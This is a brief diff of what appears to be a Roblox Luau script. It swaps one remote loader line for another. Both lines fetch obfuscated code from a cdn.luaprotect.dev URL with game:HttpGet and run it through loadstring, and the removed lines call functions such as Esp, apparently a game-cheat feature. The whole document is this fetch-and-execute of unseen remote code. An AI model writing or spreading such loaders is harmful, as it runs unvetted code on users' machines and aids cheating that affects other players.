@@ -1,7 +1,3 @@
 --!nocheck
 --!nolint
-local bruh = loadstring(game:HttpGet("https://cdn.luaprotect.dev/u/56d07f/Xdx7mpAetmU1dwTZ"))()
-bruh:Config()
-bruh:AutoGen() 
-bruh:Function() 
-bruh:Esp() 
+loadstring(game:HttpGet("https://cdn.luaprotect.dev/u/56d07f/xErUjRxeN5EgAr-V"))()
